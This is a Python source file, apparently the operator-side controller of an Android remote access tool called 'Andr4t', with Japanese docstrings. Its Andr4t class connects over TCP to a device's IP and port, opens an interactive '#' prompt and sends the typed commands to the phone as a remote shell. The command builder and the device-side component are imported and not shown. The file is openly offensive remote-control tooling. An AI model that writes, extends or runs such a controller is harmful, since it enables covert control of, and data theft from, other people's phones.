import sys

from pathlib import Path

parent_dir = str(Path(__file__).parent.parent)
sys.path.append(parent_dir + r'\common\console')
sys.path.append(parent_dir + r'\common\command')
sys.path.append(parent_dir + r'\common\define')
from tcp import Socket
from console import Console
from define import Define
from command import Command

#  _   _ _  _   _              _              _      _  _   _
# | | | | || | | |            / \   _ __   __| |_ __| || | | |_
# | |_| | || |_| |  _____    / _ \ | '_ \ / _` | '__| || |_| __|
# |  _  |__   _| | |_____|  / ___ \| | | | (_| | |  |__   _| |_
# |_| |_|  |_| |_|         /_/   \_\_| |_|\__,_|_|     |_|  \__|
#                                                   coded by H4l


class Andr4t:
    
    def __init__(self, ip: str, port: int) -> None:
        """
        コンストラクタ

        Args:
            ip (str): ipアドレス
            port (int): ポート番号
        """
        self.__socket = Socket(ip, port)
        self.__socket.start()
    
    def get_shell(self) -> None:
        """
        シェル取得
        
        Remarks:
            このメソッドでAndroid端末にコマンドを送信する
        """
        print("== shell open == \n")
        while True:
            try:
                command = input("#")
                if not self.execute_command(command):
                    continue
                Console.printl(f"Succeed to execute {command}", Define.LogType.SUCCESS)
            except Exception as e:
                Console.print(e, Define.LogType.Failed)
                return
        
    def execute_command(self, command: str) -> bool:
        """
        コマンド実行

        Args:
            command (str): ユーザーから入力を受けたコマンド

        Returns:
            bool: コマンド実行結果
        """
        try:
            cmd_bytes = Command.make_command(command)
            if cmd_bytes is None:
                return False
            
            self.__socket.send(cmd_bytes)
            return True
        except Exception as e:
            Console.printl(f"Failed to execute {command}. \n Please check connection status.", Define.LogType.ERROR)
            Console.printl(e, Define.LogType.ERROR)
            return False
